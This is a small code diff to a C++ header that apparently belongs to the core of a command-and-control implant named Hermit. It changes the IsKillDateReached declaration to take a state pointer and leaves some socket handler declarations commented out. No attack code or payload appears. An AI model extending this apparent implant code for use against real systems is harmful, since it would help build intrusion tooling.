@@ -28,7 +28,7 @@ namespace Handler
 	// BOOL SocketClose(State::PSTATE pState);
 	// BOOL SocketKill(State::PSTATE pState);
 	// BOOL Socket(State::PSTATE pState);
-	BOOL IsKillDateReached(INT nKillDate);
+	BOOL IsKillDateReached(State::PSTATE pState);
 }
 
 #endif // HERMIT_CORE_HANDLER_HPP
